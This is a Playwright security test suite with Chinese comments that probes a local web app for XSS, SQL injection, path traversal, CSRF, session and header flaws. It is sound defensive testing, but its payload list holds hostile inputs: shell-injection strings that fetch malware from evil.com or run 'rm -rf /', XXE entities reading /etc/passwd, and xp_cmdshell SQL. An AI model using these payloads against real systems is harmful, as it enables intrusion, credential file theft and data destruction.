// 安全性測試完整實作範例
// Security Testing Complete Implementation

const { test, expect } = require('@playwright/test');
const crypto = require('crypto');

test.describe('Web 應用程式安全性測試', () => {
  // 測試配置
  test.use({
    // 安全測試需要更長的超時時間
    timeout: 60000,
    // 記錄所有網路請求
    trace: 'on',
    // 保存失敗的截圖
    screenshot: 'only-on-failure'
  });

  // 安全測試 payload 集合
  const securityPayloads = {
    xss: [
      '<script>alert("XSS")</script>',
      '"><script>alert("XSS")</script>',
      '<img src=x onerror="alert(\'XSS\')">',
      '<svg onload="alert(\'XSS\')">',
      'javascript:alert("XSS")',
      '<iframe src="javascript:alert(\'XSS\')">',
      '<body onload="alert(\'XSS\')">',
      '<%2Fscript%3E%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E',
      '<ScRiPt>alert("XSS")</ScRiPt>',
      '<<SCRIPT>alert("XSS");//<</SCRIPT>',
      '<IMG """><SCRIPT>alert("XSS")</SCRIPT>">',
      '<IMG SRC="javascript:alert(\'XSS\');">',
      '<IMG SRC=JaVaScRiPt:alert(\'XSS\')>',
      '<IMG SRC=`javascript:alert("XSS")`>',
      '\';alert(String.fromCharCode(88,83,83))//\';',
      '</script><script>alert(\'XSS\')</script>',
      '<svg/onload=alert(\'XSS\')>',
      '<input onfocus=alert(\'XSS\') autofocus>',
      '<select onfocus=alert(\'XSS\') autofocus>',
      '<textarea onfocus=alert(\'XSS\') autofocus>',
      '<marquee onstart=alert(\'XSS\')>'
    ],
    sqlInjection: [
      "' OR '1'='1",
      "1' OR '1' = '1",
      "' OR 1=1--",
      "1; DROP TABLE users--",
      "' UNION SELECT * FROM users--",
      "admin'--",
      "admin' #",
      "admin'/*",
      "' or 1=1#",
      "' or 1=1--",
      "' or 1=1/*",
      "') or '1'='1--",
      "') or ('1'='1--",
      "' UNION SELECT NULL--",
      "' UNION SELECT NULL, NULL--",
      "1' AND 1=0 UNION SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'",
      "'; EXEC xp_cmdshell('dir')--",
      "1' AND 1=1; WAITFOR DELAY '00:00:05'--",
      "' OR SLEEP(5)--",
      "'; SELECT LOAD_FILE('/etc/passwd')--"
    ],
    pathTraversal: [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32\\config\\sam',
      '../../../../../../../../etc/passwd',
      '..%2F..%2F..%2Fetc%2Fpasswd',
      '..%252f..%252f..%252fetc%252fpasswd',
      '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
      '....//....//....//etc/passwd',
      'file:///etc/passwd',
      '../../../../../../../../../../etc/passwd%00',
      '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd',
      'C:\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\system32\\config\\sam',
      '/var/www/../../etc/passwd'
    ],
    commandInjection: [
      '; ls -la',
      '| ls -la',
      '`ls -la`',
      '$(ls -la)',
      '; cat /etc/passwd',
      '| cat /etc/passwd',
      '& dir',
      '| dir',
      '; wget http://evil.com/malware.sh',
      '&& curl http://evil.com/malware.sh',
      '; rm -rf /',
      '| format c:',
      '\'; DROP TABLE users--',
      '"; system("ls -la")',
      '`; uname -a`'
    ],
    xxe: [
      '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
      '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/evil.dtd">]><foo>&xxe;</foo>',
      '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]>',
      '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://ls">]><foo>&xxe;</foo>'
    ]
  };

  test.beforeEach(async ({ page }) => {
    // 監聽控制台錯誤
    page.on('console', msg => {
      if (msg.type() === 'error') {
        console.log(`控制台錯誤: ${msg.text()}`);
      }
    });

    // 監聽頁面錯誤
    page.on('pageerror', error => {
      console.log(`頁面錯誤: ${error.message}`);
    });

    // 監聽對話框（XSS 可能觸發 alert）
    page.on('dialog', async dialog => {
      console.log(`⚠️ 檢測到對話框: ${dialog.message()}`);
      await dialog.dismiss();
    });
  });

  test('XSS (跨站腳本) 防護測試', async ({ page }) => {
    await page.goto('http://localhost:3000/contact');
    
    const vulnerabilities = [];
    
    for (const payload of securityPayloads.xss) {
      // 測試各種輸入欄位
      const inputFields = await page.locator('input[type="text"], textarea').all();
      
      for (const field of inputFields) {
        const fieldName = await field.getAttribute('name') || await field.getAttribute('id');
        
        // 清空並填入 XSS payload
        await field.fill('');
        await field.fill(payload);
        
        // 提交表單或觸發事件
        const form = await field.evaluateHandle(el => el.closest('form'));
        if (form) {
          await page.keyboard.press('Enter');
        }
        
        // 等待可能的 XSS 執行
        await page.waitForTimeout(500);
        
        // 檢查是否有 alert 對話框出現
        let xssDetected = false;
        page.once('dialog', async dialog => {
          xssDetected = true;
          vulnerabilities.push({
            type: 'XSS',
            field: fieldName,
            payload: payload,
            message: dialog.message()
          });
          await dialog.dismiss();
        });
        
        // 檢查頁面內容是否包含未轉義的腳本
        const pageContent = await page.content();
        if (pageContent.includes(payload) && !pageContent.includes(escapeHtml(payload))) {
          vulnerabilities.push({
            type: 'XSS - 未轉義輸出',
            field: fieldName,
            payload: payload
          });
        }
        
        // 檢查 DOM 中是否有執行的腳本
        const hasExecutedScript = await page.evaluate((payload) => {
          const scripts = document.querySelectorAll('script');
          for (const script of scripts) {
            if (script.textContent.includes(payload)) {
              return true;
            }
          }
          return false;
        }, payload);
        
        if (hasExecutedScript) {
          vulnerabilities.push({
            type: 'XSS - DOM 執行',
            field: fieldName,
            payload: payload
          });
        }
      }
    }
    
    // 測試 URL 參數 XSS
    for (const payload of securityPayloads.xss.slice(0, 5)) {
      await page.goto(`http://localhost:3000/search?q=${encodeURIComponent(payload)}`);
      await page.waitForTimeout(500);
      
      // 檢查反射型 XSS
      const reflected = await page.evaluate(() => {
        return document.body.innerHTML.includes('<script>');
      });
      
      if (reflected) {
        vulnerabilities.push({
          type: 'Reflected XSS',
          location: 'URL parameter',
          payload: payload
        });
      }
    }
    
    // 生成報告
    console.log('=== XSS 測試結果 ===');
    if (vulnerabilities.length === 0) {
      console.log('✅ 未發現 XSS 漏洞');
    } else {
      console.log(`⚠️ 發現 ${vulnerabilities.length} 個潛在 XSS 漏洞:`);
      vulnerabilities.forEach(vuln => {
        console.log(`  - ${vuln.type} in ${vuln.field || vuln.location}`);
        console.log(`    Payload: ${vuln.payload.substring(0, 50)}...`);
      });
    }
    
    expect(vulnerabilities.length).toBe(0);
  });

  test('SQL 注入防護測試', async ({ page, request }) => {
    const vulnerabilities = [];
    
    // 測試登入表單
    await page.goto('http://localhost:3000/login');
    
    for (const payload of securityPayloads.sqlInjection) {
      // 測試用戶名欄位
      await page.fill('[name="username"]', payload);
      await page.fill('[name="password"]', 'password');
      
      // 攔截網路請求
      const [response] = await Promise.all([
        page.waitForResponse(resp => resp.url().includes('/api/login')),
        page.click('[type="submit"]')
      ]);
      
      // 檢查回應
      const responseText = await response.text();
      const responseStatus = response.status();
      
      // 檢查 SQL 錯誤訊息
      const sqlErrors = [
        'SQL syntax',
        'mysql_fetch',
        'Warning: mysql',
        'MySQLSyntaxErrorException',
        'PostgreSQL',
        'warning: pg_',
        'valid PostgreSQL result',
        'mssql_',
        'SQLServer JDBC Driver',
        'SqlException',
        'ORA-01756',
        'Oracle error',
        'Oracle driver',
        'SQLite',
        'sqlite3',
        'database is locked'
      ];
      
      for (const error of sqlErrors) {
        if (responseText.toLowerCase().includes(error.toLowerCase())) {
          vulnerabilities.push({
            type: 'SQL Injection - Error Based',
            payload: payload,
            error: error
          });
          break;
        }
      }
      
      // 檢查是否繞過認證
      if (responseStatus === 200 && responseText.includes('dashboard')) {
        vulnerabilities.push({
          type: 'SQL Injection - Authentication Bypass',
          payload: payload
        });
      }
      
      // 重置表單
      await page.goto('http://localhost:3000/login');
    }
    
    // 測試搜尋功能
    await page.goto('http://localhost:3000/search');
    
    for (const payload of securityPayloads.sqlInjection.slice(0, 5)) {
      await page.fill('[name="search"]', payload);
      await page.click('[type="submit"]');
      
      // 等待結果
      await page.waitForTimeout(1000);
      
      // 檢查是否有異常資料返回
      const results = await page.locator('.search-result').count();
      if (results > 100) { // 異常大量的結果可能表示注入成功
        vulnerabilities.push({
          type: 'SQL Injection - Data Extraction',
          location: 'Search',
          payload: payload
        });
      }
    }
    
    // 測試 API 端點
    const apiEndpoints = [
      '/api/users',
      '/api/products',
      '/api/orders'
    ];
    
    for (const endpoint of apiEndpoints) {
      for (const payload of securityPayloads.sqlInjection.slice(0, 3)) {
        const response = await request.get(`http://localhost:3000${endpoint}?id=${payload}`);
        const responseText = await response.text();
        
        // 檢查錯誤訊息
        if (responseText.includes('SQL') || responseText.includes('syntax')) {
          vulnerabilities.push({
            type: 'SQL Injection - API',
            endpoint: endpoint,
            payload: payload
          });
        }
      }
    }
    
    // 生成報告
    console.log('=== SQL 注入測試結果 ===');
    if (vulnerabilities.length === 0) {
      console.log('✅ 未發現 SQL 注入漏洞');
    } else {
      console.log(`⚠️ 發現 ${vulnerabilities.length} 個潛在 SQL 注入漏洞:`);
      vulnerabilities.forEach(vuln => {
        console.log(`  - ${vuln.type}`);
        console.log(`    位置: ${vuln.location || vuln.endpoint || 'Login'}`);
        console.log(`    Payload: ${vuln.payload.substring(0, 30)}...`);
      });
    }
    
    expect(vulnerabilities.length).toBe(0);
  });

  test('路徑遍歷 (Path Traversal) 測試', async ({ page, request }) => {
    const vulnerabilities = [];
    
    // 測試文件下載功能
    for (const payload of securityPayloads.pathTraversal) {
      const response = await request.get(`http://localhost:3000/download?file=${payload}`);
      const responseText = await response.text();
      const responseStatus = response.status();
      
      // 檢查是否成功讀取系統文件
      const systemFileIndicators = [
        'root:',
        '/bin/bash',
        'Windows\\System32',
        '[extensions]',
        'Program Files',
        'passwd',
        'shadow',
        'hosts'
      ];
      
      for (const indicator of systemFileIndicators) {
        if (responseText.includes(indicator)) {
          vulnerabilities.push({
            type: 'Path Traversal',
            payload: payload,
            leaked: indicator
          });
          break;
        }
      }
    }
    
    // 測試圖片上傳功能
    await page.goto('http://localhost:3000/upload');
    
    for (const payload of securityPayloads.pathTraversal.slice(0, 3)) {
      // 創建惡意文件名
      const maliciousFilename = `${payload}.jpg`;
      
      // 模擬文件上傳
      const fileInput = page.locator('input[type="file"]');
      await fileInput.setInputFiles({
        name: maliciousFilename,
        mimeType: 'image/jpeg',
        buffer: Buffer.from('fake image content')
      });
      
      await page.click('[type="submit"]');
      await page.waitForTimeout(500);
      
      // 檢查是否能訪問上傳的文件
      const uploadResponse = await request.get(`http://localhost:3000/uploads/${maliciousFilename}`);
      if (uploadResponse.status() === 200) {
        vulnerabilities.push({
          type: 'Path Traversal - Upload',
          payload: maliciousFilename
        });
      }
    }
    
    console.log('=== 路徑遍歷測試結果 ===');
    if (vulnerabilities.length === 0) {
      console.log('✅ 未發現路徑遍歷漏洞');
    } else {
      console.log(`⚠️ 發現 ${vulnerabilities.length} 個路徑遍歷漏洞`);
    }
    
    expect(vulnerabilities.length).toBe(0);
  });

  test('認證和授權測試', async ({ page, context }) => {
    const issues = [];
    
    // 測試未認證訪問受保護資源
    const protectedPages = [
      '/dashboard',
      '/admin',
      '/profile',
      '/settings'
    ];
    
    for (const protectedPage of protectedPages) {
      const response = await page.goto(`http://localhost:3000${protectedPage}`);
      
      if (response.status() === 200) {
        const content = await page.content();
        if (!content.includes('login') && !content.includes('unauthorized')) {
          issues.push({
            type: 'Unauthorized Access',
            page: protectedPage
          });
        }
      }
    }
    
    // 測試會話固定攻擊
    await page.goto('http://localhost:3000/login');
    
    // 獲取初始會話 ID
    const initialCookies = await context.cookies();
    const initialSessionId = initialCookies.find(c => c.name === 'sessionId')?.value;
    
    // 登入
    await page.fill('[name="username"]', 'testuser');
    await page.fill('[name="password"]', 'testpass');
    await page.click('[type="submit"]');
    
    // 檢查會話 ID 是否改變
    const afterLoginCookies = await context.cookies();
    const afterLoginSessionId = afterLoginCookies.find(c => c.name === 'sessionId')?.value;
    
    if (initialSessionId === afterLoginSessionId) {
      issues.push({
        type: 'Session Fixation',
        description: '登入後會話 ID 未更新'
      });
    }
    
    // 測試權限提升
    // 以普通用戶身份嘗試訪問管理員功能
    const adminEndpoints = [
      '/api/admin/users',
      '/api/admin/settings',
      '/api/admin/logs'
    ];
    
    for (const endpoint of adminEndpoints) {
      const response = await page.request.get(`http://localhost:3000${endpoint}`);
      if (response.status() === 200) {
        issues.push({
          type: 'Privilege Escalation',
          endpoint: endpoint
        });
      }
    }
    
    // 測試 JWT 漏洞（如果使用 JWT）
    const jwtCookie = afterLoginCookies.find(c => c.name === 'jwt');
    if (jwtCookie) {
      // 嘗試修改 JWT
      const tamperedJwt = jwtCookie.value.replace(/\./g, '.');
      await context.addCookies([{
        name: 'jwt',
        value: tamperedJwt,
        domain: 'localhost',
        path: '/'
      }]);
      
      const response = await page.goto('http://localhost:3000/dashboard');
      if (response.status() === 200) {
        issues.push({
          type: 'JWT Validation',
          description: '接受被篡改的 JWT'
        });
      }
    }
    
    // 測試密碼重置流程
    await page.goto('http://localhost:3000/forgot-password');
    await page.fill('[name="email"]', 'test@example.com');
    await page.click('[type="submit"]');
    
    // 檢查是否洩露用戶存在資訊
    const resetMessage = await page.textContent('.message');
    if (resetMessage.includes('用戶不存在')) {
      issues.push({
        type: 'Information Disclosure',
        description: '密碼重置洩露用戶存在資訊'
      });
    }
    
    console.log('=== 認證授權測試結果 ===');
    if (issues.length === 0) {
      console.log('✅ 認證授權機制正常');
    } else {
      console.log(`⚠️ 發現 ${issues.length} 個問題:`);
      issues.forEach(issue => {
        console.log(`  - ${issue.type}: ${issue.description || issue.page || issue.endpoint}`);
      });
    }
    
    expect(issues.length).toBe(0);
  });

  test('敏感資料暴露測試', async ({ page, context }) => {
    const exposures = [];
    
    await page.goto('http://localhost:3000');
    
    // 檢查 localStorage
    const localStorageData = await page.evaluate(() => {
      return Object.entries(localStorage);
    });
    
    const sensitivePatterns = [
      /password/i,
      /token/i,
      /api[_-]?key/i,
      /secret/i,
      /private/i,
      /ssn/i,
      /credit[_-]?card/i
    ];
    
    for (const [key, value] of localStorageData) {
      for (const pattern of sensitivePatterns) {
        if (pattern.test(key) || pattern.test(value)) {
          exposures.push({
            type: 'localStorage',
            key: key,
            value: value.substring(0, 20) + '...'
          });
        }
      }
    }
    
    // 檢查 sessionStorage
    const sessionStorageData = await page.evaluate(() => {
      return Object.entries(sessionStorage);
    });
    
    for (const [key, value] of sessionStorageData) {
      for (const pattern of sensitivePatterns) {
        if (pattern.test(key) || pattern.test(value)) {
          exposures.push({
            type: 'sessionStorage',
            key: key,
            value: value.substring(0, 20) + '...'
          });
        }
      }
    }
    
    // 檢查 Cookies
    const cookies = await context.cookies();
    for (const cookie of cookies) {
      // 檢查不安全的 cookie 設置
      if (!cookie.secure && cookie.name.toLowerCase().includes('session')) {
        exposures.push({
          type: 'Insecure Cookie',
          name: cookie.name,
          issue: 'Missing Secure flag'
        });
      }
      
      if (!cookie.httpOnly && sensitivePatterns.some(p => p.test(cookie.name))) {
        exposures.push({
          type: 'Insecure Cookie',
          name: cookie.name,
          issue: 'Missing HttpOnly flag'
        });
      }
      
      if (!cookie.sameSite || cookie.sameSite === 'none') {
        exposures.push({
          type: 'Insecure Cookie',
          name: cookie.name,
          issue: 'Missing or weak SameSite attribute'
        });
      }
    }
    
    // 檢查 HTML 註釋中的敏感資訊
    const htmlContent = await page.content();
    const commentRegex = /<!--[\s\S]*?-->/g;
    const comments = htmlContent.match(commentRegex) || [];
    
    for (const comment of comments) {
      for (const pattern of sensitivePatterns) {
        if (pattern.test(comment)) {
          exposures.push({
            type: 'HTML Comment',
            content: comment.substring(0, 50) + '...'
          });
        }
      }
    }
    
    // 檢查 JavaScript 中的硬編碼憑證
    const scripts = await page.evaluate(() => {
      const scriptContents = [];
      document.querySelectorAll('script').forEach(script => {
        if (script.textContent) {
          scriptContents.push(script.textContent);
        }
      });
      return scriptContents;
    });
    
    for (const script of scripts) {
      // 檢查 API 金鑰模式
      const apiKeyPatterns = [
        /['"]api[_-]?key['"]:\s*['"][^'"]+['"]/gi,
        /apiKey\s*=\s*['"][^'"]+['"]/gi,
        /Authorization:\s*['"]Bearer\s+[^'"]+['"]/gi
      ];
      
      for (const pattern of apiKeyPatterns) {
        const matches = script.match(pattern);
        if (matches) {
          exposures.push({
            type: 'Hardcoded Credential',
            location: 'JavaScript',
            match: matches[0].substring(0, 30) + '...'
          });
        }
      }
    }
    
    // 檢查網路請求中的敏感資料
    const requests = [];
    page.on('request', request => {
      const url = request.url();
      const headers = request.headers();
      
      // 檢查 URL 中的敏感參數
      if (url.includes('password=') || url.includes('token=') || url.includes('apikey=')) {
        exposures.push({
          type: 'Sensitive Data in URL',
          url: url.substring(0, 50) + '...'
        });
      }
      
      // 檢查未加密的敏感資料傳輸
      if (url.startsWith('http://') && !url.includes('localhost')) {
        const postData = request.postData();
        if (postData && sensitivePatterns.some(p => p.test(postData))) {
          exposures.push({
            type: 'Unencrypted Transmission',
            url: url
          });
        }
      }
    });
    
    // 導航到需要認證的頁面以觸發更多請求
    await page.goto('http://localhost:3000/login');
    await page.fill('[name="username"]', 'testuser');
    await page.fill('[name="password"]', 'testpass');
    await page.click('[type="submit"]');
    
    console.log('=== 敏感資料暴露測試結果 ===');
    if (exposures.length === 0) {
      console.log('✅ 未發現敏感資料暴露');
    } else {
      console.log(`⚠️ 發現 ${exposures.length} 個敏感資料暴露問題:`);
      exposures.forEach(exposure => {
        console.log(`  - ${exposure.type}: ${exposure.key || exposure.name || exposure.url || exposure.location}`);
        if (exposure.issue) {
          console.log(`    問題: ${exposure.issue}`);
        }
      });
    }
    
    expect(exposures.length).toBe(0);
  });

  test('CSRF (跨站請求偽造) 測試', async ({ page, context }) => {
    const vulnerabilities = [];
    
    // 登入以獲取有效會話
    await page.goto('http://localhost:3000/login');
    await page.fill('[name="username"]', 'testuser');
    await page.fill('[name="password"]', 'testpass');
    await page.click('[type="submit"]');
    
    // 獲取 CSRF token（如果存在）
    const csrfToken = await page.evaluate(() => {
      const tokenMeta = document.querySelector('meta[name="csrf-token"]');
      const tokenInput = document.querySelector('input[name="csrf_token"]');
      return tokenMeta?.content || tokenInput?.value;
    });
    
    if (!csrfToken) {
      vulnerabilities.push({
        type: 'Missing CSRF Token',
        description: '頁面缺少 CSRF 保護'
      });
    }
    
    // 測試狀態改變操作
    const stateChangingEndpoints = [
      { url: '/api/profile', method: 'POST' },
      { url: '/api/settings', method: 'PUT' },
      { url: '/api/transfer', method: 'POST' },
      { url: '/api/delete-account', method: 'DELETE' }
    ];
    
    for (const endpoint of stateChangingEndpoints) {
      // 嘗試不帶 CSRF token 的請求
      const response = await page.request[endpoint.method.toLowerCase()](
        `http://localhost:3000${endpoint.url}`,
        {
          data: { test: 'data' },
          headers: {
            'Content-Type': 'application/json'
          }
        }
      );
      
      if (response.status() === 200 || response.status() === 201) {
        vulnerabilities.push({
          type: 'CSRF Vulnerability',
          endpoint: endpoint.url,
          method: endpoint.method
        });
      }
    }
    
    // 測試 Referer 驗證
    const maliciousReferer = 'http://evil.com';
    const response = await page.request.post('http://localhost:3000/api/profile', {
      headers: {
        'Referer': maliciousReferer
      },
      data: { name: 'hacked' }
    });
    
    if (response.status() === 200) {
      vulnerabilities.push({
        type: 'Weak Referer Validation',
        description: '接受來自外部網站的請求'
      });
    }
    
    console.log('=== CSRF 測試結果 ===');
    if (vulnerabilities.length === 0) {
      console.log('✅ CSRF 防護正常');
    } else {
      console.log(`⚠️ 發現 ${vulnerabilities.length} 個 CSRF 漏洞`);
    }
    
    expect(vulnerabilities.length).toBe(0);
  });

  test('安全標頭測試', async ({ page }) => {
    const response = await page.goto('http://localhost:3000');
    const headers = response.headers();
    const missingHeaders = [];
    
    // 必要的安全標頭
    const requiredHeaders = {
      'x-frame-options': ['DENY', 'SAMEORIGIN'],
      'x-content-type-options': ['nosniff'],
      'x-xss-protection': ['1; mode=block'],
      'strict-transport-security': ['max-age=31536000'],
      'content-security-policy': null, // 只檢查存在性
      'referrer-policy': ['no-referrer', 'strict-origin-when-cross-origin']
    };
    
    for (const [header, expectedValues] of Object.entries(requiredHeaders)) {
      const headerValue = headers[header.toLowerCase()];
      
      if (!headerValue) {
        missingHeaders.push({
          header: header,
          issue: 'Missing'
        });
      } else if (expectedValues && !expectedValues.includes(headerValue)) {
        missingHeaders.push({
          header: header,
          issue: `Weak value: ${headerValue}`
        });
      }
    }
    
    console.log('=== 安全標頭測試結果 ===');
    if (missingHeaders.length === 0) {
      console.log('✅ 所有安全標頭都已正確設置');
    } else {
      console.log(`⚠️ 發現 ${missingHeaders.length} 個標頭問題:`);
      missingHeaders.forEach(issue => {
        console.log(`  - ${issue.header}: ${issue.issue}`);
      });
    }
    
    expect(missingHeaders.length).toBe(0);
  });
});

// 輔助函數
/**
 *
 * @param {*} unsafe - unsafe 參數
 */
function escapeHtml(unsafe) {
  return unsafe
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#039;");
}

/**
 *
 * @param {*} length - length 參數
 */
function generateRandomString(length) {
  return crypto.randomBytes(length).toString('hex');
}